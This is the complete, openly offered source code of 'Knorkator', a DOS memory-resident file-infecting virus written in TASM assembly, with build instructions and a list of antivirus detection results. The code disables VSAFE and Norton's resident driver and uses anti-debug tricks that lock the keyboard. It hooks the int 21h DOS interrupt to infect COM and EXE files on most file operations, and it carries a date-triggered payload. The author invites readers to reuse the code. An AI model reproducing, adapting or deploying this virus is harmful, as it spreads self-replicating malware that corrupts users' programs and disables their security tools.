; [VirusName] : Knorkator
; [VirusAutor]: Acid Bytes
; [Type]      : TSR COM/EXE/BIN/OVL/OVR infector
; [Date]      : 09/10/99
; [Special F.]: Some retro/anti-debug technics, safety checks and error handling. It infects on:
;               execute, open, ext. open, delete, attrib, rename, create and close !!!
; [Based on]  : The virus code is based on no-frills code, using direct manipulation
;               of the MCB chain. 
; [Size]      : 1000 bytes
; [Info]      : This is just a funny virus, with funny payload and so on, nothing really 
;               groundbreaking or new. The code is commented, so newbies may learn from it.
;               Feel free to use some of the code in your own virus if you like to.
; [Detection] : -AVPv3.0 (build129)-->suspicous,type:ComTsr
;               -AVGv6.0 --->detected as infected/not specific
;               -Norton Antivirus v5.00.01 --->no detection
;               -IKARUS virusUTILITIES v3.13a --->no detection
;               -Thunderbyte AntiVirus v8.07pro --->detected as Burma.1 virus
;               --->flags: c,F,L,M,Z,O,B,X,t (guess thats all a virus can have,hehe)
; U see, like said it's a fun-virus, which is not prepared to survive in the wild.
; [Contact]   :  acidbytes@gmx.net -> IRC: Undernet/#vir/#virus
; ____________________________________________________________________________________________
; [Compile]   : TASM /m knork.asm
;             : TLINK /t knork.obj
; ____________________________________________________________________________________________

.286                              ;use .286 instructions
.model tiny                       ;like it says
.code
JUMPS                             ;this code is for TASM only
org 100h                          ;100h is where to .com file starts                      


virusstart:
jmp real_begin                   ;Virus jumps to the real beginning of code

Anti_Debug:     
in      al,20   ;get IRQ status...
or      al,2    ;Disable IRQ 1 (keyboard)
out     20,al   ;--->KEYBOARD SUCCESSFULLY LOCKED!
int     3       ;stops the debugger on each loop 
int     3       ;when the debugger
                ;stops here, the keyboard will be disabled,
                ;so the user can't do anything!
                ;thanx to Sepultura for this one... 

loop Anti_Debug    


mov cx,0ffffh                    ;Thanx goes out to Septic for
fprot_loop:                      ;this piece of code
jmp back                         ;It should fool F-prot
mov ax,4c00h                     ;and some debuggers if trying
int 21h                          ;to trace through the
int 20h                          ;Code
back:
loop fprot_loop

real_begin:

set_some_equals:                 ;set some equals like "variables"
vsize	equ	buffer-start
psize	equ	(handle-start+2)/10h+1
EXE_dsp	equ	EXE_dispatch-COM_dispatch
fname	equ	buffer+1ah
handle	equ	fname+1dh

start:
anti_vsafe:
mov ax,0fa01h                    ;removes resident VSAFE from memory
mov dx,5945h                     ;i know that nobody's using VSAFE anymore,but 
int 16h                          ;i just like that small anti-ms routine

DisableNAVTSR:
mov ax,0FE02H                    ;this disables Norton AntiVirus 4.0 "NAVTSR" resident driver.
mov si,4E41H                     ;-> this was taken from VLAD#6, thanks to "Mouth of Sauron"
mov di,4E55H
int 2FH

;---------------------------------------------------------------------------------------------
; The payload (display a message, creating directories) will only activate on
; friday the 21st...The next routine checks the date
;---------------------------------------------------------------------------------------------
PayloadLoadChecker:
mov ah,2ah                       ;Get system date function 
int 21h                          ;do!
cmp al,5h                        ;compare...if it's friday
jne startvir                     ;if not so jump to startvir  
mov ah,2ah                       ;get date
int 21h                          ;do!
cmp dl,15h                       ;see if it's the 21st (21 is 15 in hex)
jne startvir                     ;jump to startvir if not equal

payload:                         ;this is the payload, it shows the Knorkator-Message on the 
mov ah,9h                        ;screen...and creates 3 subdirs on the HD 
lea dx, message
int 21h

mov ah,39h                       ;create new directory function
lea dx, dirname1                 ;cx=name of directory --> "STUMPEN!"
int 21h                          ;do!
mov ah,39h                       
lea dx, dirname2                 ;creates "ALFATOR!" 
int 21h                          
mov ah,39h                       
lea dx, dirname3                 ;creates "BUZZDEE!"
int 21h                          
;-------------------------------------------------------------------------------------
; Here does the payload end, and the virus begins
;-------------------------------------------------------------------------------------

startvir:
        pusha                   ;save registers
        push    ds                           
        push    es                           
        push    cs              ;set cs=ds=es-->so they are equal filled                          
        push    cs                           
        pop     ds                           
        pop     es                           
                                             
res_check:                                   
        mov     ax,3030h        ;is the virus already resident?                     
        int     21h             ;do!                 
        cmp     ax,303h         ;compares ax to 303h                 
        jne     install         ;if not equal->go resident                          
        cmp     bx,ax                            
        jnz     install         ;no?               
        jmp     short dispatch  ;yeah, let the proggie go      

                                                         
install:                                                 
        mov     ah,52h          ;SYSVARS-> get list!
        int     21h             ;do!
        mov     ax,es:[bx-2]    ;gets the segment of the first MCB
	xor	si,si           ;empty SI(set zero)
                                                                 
find_mem:                       ;trace through the MCB chain                                                        
        mov     ds,ax                                            
        cmp     byte ptr [si],'Z'       ;last block is marked with Z                                
        je      found_MCB               ;if found last block of MCB goto found_MCB!                                   
        mov     bx,ax           ;if not found->save the segment of the previous one                                        
        add     ax,[si+3]       ;off to the next one
        INC AX                                   
        jmp     short find_mem  ;run the routine again to find memory                            
                                                            
found_MCB:                                          
        cmp     word ptr [si+3h],psize  ;compare the ammount of found memory to virus size              
        jae     fix_block               ;if size is equal or more goto fix_block          
        mov     ds,bx                   ;if not-> use the previous one              
        xchg    ax,bx                   ;set ax=bx                                
                                                                        
fix_block:                                                              
        sub     word ptr [si+3],psize   ;substract the virus size from memory block
        add     ax,word ptr [si+3]      ;find its end(add the memory size to ax)
        inc     ax              
        mov     word ptr [si+12h],ax    ;feed new value to the owner's PSP
        mov     es,ax                                             
        push    cs                                                
        pop     ds                   
        mov     di,100h              
        mov     si,offset start 
        mov     cx,vsize
        rep     movsb           ;copy the virus         
	push	es
	mov	ax,offset get_int21h
	push	ax
	retf

                                               
get_int21h:                                    
        mov     ax,3521h                 ;get the adress of int 21h!                        
        int     21h                      ;do it!       
	push	cs
	pop	ds
        mov     word ptr [old_21h],bx    ;save the old int21 in bx          
        mov     word ptr [old_21h+2],es  ;save old int21+2 bytes in es       
        mov     ax,2521h                 ;set the new int 21h-function                     
        mov     dx,offset int21h_handler ;put the int21h-handler in dx                    
        int     21h                      ;do!                   
                                                            
dispatch:                                                   
jump    db      0e9h    ;determines how the file is beeing dispatched                                        
dest    dw      0       ;this structure is also used in COM infection                                           

autor_and_name       db '[Knorkator]',0
                     db '(c) 1999 Acid Bytes',0
                                                            
COM_dispatch:                                               
        pop     es                                          
        pop     ds                                          
        popa                                                
        mov     si,offset csip  ;where the old code is saved
        mov     di,100h                                     
        push    di                                          
        movsw                   ;restore first 3 bytes
        movsb                                               
        pop     di                                          
        xor     si,si                                       
        jmp     di              ;go there                                          
                                                            
EXE_dispatch:                    
        mov     si,offset sssp
        cli                   
        lodsw                 
        mov     ss,ax           ;restore stack         
        lodsw                 
        mov     sp,ax         
        sti                   
        pop     es            
        pop     ds            
        popa                  
        db      0eah            ;jmp far to the csip address          
csip    dd      0                
sssp    dd      0                
                                 
int21h_handler:                  
        cmp     ax,3030h        ;compares ax to 3030h(if equal) 
        je      install_check   ;if equal (means NOT resident) -->jump to installation check
        cmp     ah,3ch          ;if ah=3ch(create file f.) then  
        je      create          ;jump to "create" 
        cmp     ah,3dh          ;if ah=3dh(open file function) then 
        je      open            ;jump to "open" 
        cmp     ah,3eh          ;if ah=3eh(close file function) then
        je      close           ;jump to "CLOSE" 
        cmp     ah,41h          ;if "UNLINK"-function
        je      open            ;jump to "open" 
        cmp     ah,4bh          ;if "EXECUTE"-function
        je      open            ;jump to "open" 
        cmp     ah,43h          ;if "CHMOD"
        je      open            ;jump to "open" 
        cmp     ah,56h          ;if "RENAME"
        je      open            ;jump to open       
        cmp     ax,6c00h        ;if extended open/create THEN
        je      extopen         ;jump to EXTENDED OPEN                      
                                 
return_21h:                      
        db      0eah            ;jmp far to the old int 21h vector
old_21h dd      0                
                                 
install_check:                   
        mov     ax,303h          
        mov     bx,ax            
_iret:                           
        iret                    ;useful iret opcode                     
                                 
create:                          
        mov     si,dx            
        call    save_name       ;call the save the file's name-routine       
        call    int21h                          ;call int21h-handler
        mov     word ptr cs:[handle],ax         ;save its handle in ax
        iret                                    ;return                    
                                                       
close:                                                 
        push    bx                      ;save handle   
        call    int21h                  ;call int21h-handler               
        push    cs                                     
        pop     ds                                     
        mov     dx,offset fname         ;set ds:dx to file's name/put filename in dx                        
        pop     ax                                     
        cmp     ax,word ptr cs:[handle] ;same handle as the one we saved?                
        je  	ext_entry               ;if the same --> continue                               
        iret                            ;else, get outta here                                           
                                                             
extopen:                                                     
       	pusha                                                
        push    ds                                           
        push    es                                           
        mov     dx,si           ;moves the dx-value(filename) to si
        jmp     short letsgo    ;jump to letsgo                             
                                                             
ext_entry:                                                   
        mov     ah,30h          ;DOS version check                                       
                                ;this is needed because closed files aren't specially
                                ;handled, they use the same routines
open:         
        pusha 
        push    ds
        push    es            
                  
letsgo:           
        push    cs   
        pop     ds   
        push    cs   
        pop     es   
        mov     cx,6
        cld       
        call    save_name       ;call the save_name-routine(save the name for later use)
        mov     dx,di    
        mov     si,di    
        lodsw                   ;get first two chars of filename     
        and     ax,0dfdfh       ;capitalise them
                         
k_check:                 
        scasw                   ;check if they match those of bad files            
        je      fn_return       ;if found "good one" jump to fn_return
        loop    k_check         ;loops the k_check until finding a good one
                                     
k_zero:                                
        lodsb                   ;find the zero in the ascii string                   
        or      al,al           
        jnz     k_zero          ;jump to k_zero if not zero
        sub     si,4            ;substract 4 from si-value
        mov     cx,5            ;move 5 do cx
        mov     di,offset exts  ;check if the extensions match with those 
        lodsw                   ;we can infect                   
        and     ax,0dfdfh                     
                                              
ext_check:                                    
        scasw                                 
        je      ext_verify      ;if they match then jump to ext_verify               
        inc     di                            
        loop    ext_check       ;loop ext_check until match              
        jmp     short fn_return ;jump to fn_return              
                                              
ext_verify:                                   
        lodsb                                 
        and     al,0dfh                       
        scasb                                 
        je      fn_return                     
        jmp     short set24h_handler          
                                              
close_file:                                   
        mov     ah,3eh          ;close file function                        
        call    int21h          ;call int21h-handler              
        pop     ax              ;reset attributes                            
        pop     cx                            
        mov     dx,offset fname ;put fname in dx              
        call    int21h          ;call int21h-handler            
                                              
reset_int24h:                                 
        pop     ax                            
        pop     dx                            
        pop     ds                            
        call    int21h          ;call int21h-handler(resets int 24h)                        
                                              
fn_return:                                    
     	pop  	es              ;restore all registers                            
       	pop  	ds                            
 	popa                                  
      	jmp    	return_21h      ;jumps to return_21h (proceed with the original call)   
                                              
set24h_handler:                               
        mov     ax,3524h        ;point int 24h to an iret opcode                      
        call    int21h          ;call int21h-handler             
        push    es                            
        push    bx                            
        mov     ax,2524h                      
        push    ax                            
        mov     dx,offset _iret               
        call    int21h          ;call int21h-handler              
        push    cs                            
        pop     ds                            
        push    cs                            
        pop     ds                            
                                              
open_file:                                    
        mov     dx,offset fname ;put fname in dx
        mov     ax,4300h                    
        call    int21h          ;do!
        push    cx              ;save attributes                          
        mov     ax,4301h                                      
        xor     cx,cx           ;clear attributes (no attributes)                       
        push    ax                          
        call    int21h          ;do!            
        mov     ax,3d02h        ;open file read/write function       
        call    int21h          ;do!     
        mov     di,offset handle        ;save file handle in di
        stosw                   
        xchg    ax,bx           ;move handle from ax into bx                
                                
process_file:                   
        mov     ax,5700h        
        call    int21h          ;call int21h-handler
        push    cx             
        push    dx             
        mov     cx,ax           ;check for previous infection (time stamp)
        shr     ax,6           
        or      al,00011111b    ;is seconds/2 = minutes/2?
        or      cl,00011111b   
        cmp     al,cl          
        je      bomb_out        ;if already infected, jump to bomb_out
        mov     ah,3fh          ;if not-->read in 1ah bytes (EXE header)         
        mov     cx,1ah         
        mov     dx,offset buffer ;put virus size in dx
        mov     si,dx          
        call    int21h          ;call int21h-handler 
        lodsw                  
        xchg    ax,bp         
        call    lseek_EOF                              
        cmp     bp,'MZ'         ;true MZ EXE-check       
        je      EXE_file        ;if yes, jump to EXE_file         
        cmp     bp,'ZM'         ;sometimes the signature is "ZM" then
        je      EXE_file        ;jump to EXE_file too
                              
COM_file:                       ;else, assume it's a COM file                            
        or      dx,dx
        jnz     bomb_out        ;we can't infect .com files over 64k
        sub     ax,3            ;substract 3 from the file size          
        mov     di,offset dest                        
        stosw                   ;write it into a jmp near instruction                    
        dec     si         
        dec     si         
        mov     di,offset csip  ;save the original code
        movsw              
        movsb              
        call    lseek_BOF                              
        mov     ah,40h               
        mov     cx,3       
        mov     dx,offset jump   
        call    int21h          ;call int21h-handler (write the jmp near)                      
        xor     ax,ax           ;set ax,ax(set ax=0)(dispatched as COM)
        stosw                                     
        jmp     write_end       ;jump to write_end(routine writes virus to file-end)  
                                                                  
bomb_out:                                                         
        pop     dx              ;restore registers                                  
        pop     cx              ;and
        jmp     close_file      ;jump to close_file
                                                  
EXE_file:                      
        push    dx                     
        push    ax               
        push    dx         
        push    ax         
        lodsw                   ;get part_pag     
        xchg    bp,ax            
        lodsw                   ;get pag_cnt      
        mov     cx,200h                           
        mul     cx                                
        add     ax,bp            
        pop     cx              ;save registers                             
        pop     bp               
        cmp     ax,cx           ;is declared size the real physical size?
        jb      bomb_out        ;get out of here, if size is below 
        cmp     dx,bp           ;---->                       
        jb      bomb_out        ;---->same here                       
                                                       
save_old_shit:                          ;save old cs:ip and ss:sp                                         
        mov     di,offset buffer        ;moves the virussize to di
        cmp     word ptr [di+18h],40h   
        jae     bomb_out                ;get out here if above or equal
        push    di                      ;save di
        mov     si,offset buffer+0eh
        mov     di,offset sssp                         
        movsw                   ;old ss                
        movsw                   ;old sp                
        lodsw                                          
        mov     di,offset csip                         
        movsw                   ;old ip                
        movsw                   ;old cs                
                                                       
fix_csip:                                              
        pop     di
        pop     ax              ;calculate new cs:ip
        pop     dx                  
        mov     cl,0ch                                       
        shl     dx,cl               
        push    ax                  
        mov     cl,4                
        shr     ax,cl               
        add     dx,ax               
        shl     ax,cl               
        pop     cx
        sub     cx,ax                      
        mov     word ptr [di+14],cx     ;ip
        mov     word ptr [di+16],dx     ;cs
                  
fix_sssp:                               ;set new ss:sp                                             
        mov     word ptr [di+0eh],dx
        mov     ax,0fffeh
        mov     word ptr [di+10h],ax
                                       
fix_pages:                      ;do pag cnt and part pag
        pop     ax              ;reload virus size into dx:ax           
        pop     dx              ;restore dx
        add     ax,vsize        ;adds virussize to ax                             
        adc     dx,0                                  
        mov     cx,200h                               
        div     cx                                    
        or      dx,dx                                 
        jz      no_inc                                
        inc     ax                                    
                                                      
no_inc:                                 ;adjust the page data                                                
        mov     word ptr [di+2],dx      ;part pag
        mov     word ptr [di+4],ax      ;pag cnt
                            
all_done:                   
        mov     ax,EXE_dsp                            
        mov     di,offset dest                        
        stosw                                                  
        call    lseek_BOF                             
        mov     ax,40h                                
        mov     cx,1ah                                
        mov     dx,offset buffer
        call    int21h                  ;write the new header,do it!                                
                                                      
write_end:                              ;write the body to the end                                                 
        call    lseek_EOF               ;call "seek to end of file"
        mov     ah,40h                            
        mov     cx,vsize               
        mov     dx,offset start
        call    int21h    
        pop     dx        
        pop     cx        
        mov     cx,ax     
        shr     ax,6      
        and     al,00011111b    ;set our marker (time stamp)
        and     cl,11100000b                                
        or      cl,al           ;seconds/2 = minutes/2      
        mov     ax,5701                                     
        call    int21h                                      
        jmp     close_file      ;all done                                  

                                                            
int21h:                         ;do an int 21h call                                                     
        pushf                                               
        call    dword ptr cs:[old_21h]                      
        ret                                                 
                                                            
lseek_BOF:                      ;lseek to beginning of file                                                  
        xor     al,al                                       
        jmp     short lseek                                 
                                
lseek_EOF:                      ;lseek to the end of file                    
        mov     al,02h                                   
                                                         
lseek:                                                   
        mov     ah,42h          ;just lseek                                  
        xor     cx,cx           ;equalize cx (set cx=0)                         
        cwd                                            
        call    int21h          ;calls int21h handler           
        ret                                
                                           
save_name:                                 
        mov     di,offset fname         ;saves the file name in di            
        mov     cx,0dh                  ;source = ds:si, destination = es:di                     
        rep     movsb                      
        ret                                
                                          
names   db 'SCCLVSVINATBF',0dh  ;files, which we don't want to infect              
exts    db 'COMEXEBINOVLOVR'    ;files we want to infect!                           
                                           

message  db 'We have been in Flechtingen/Germany on 05/21/99.'
         db ' Knorkator rules!'
         db ' Cmon, its     '
         db 'friday the 21st-take some friends together and njoy life...'
         db 0Dh, 0Ah, '$'

dirname1 db 'STUMPEN!',0
dirname2 db 'ALFATOR!',0
dirname3 db 'BUZZDEE!',0


buffer:                                                 
end virusstart

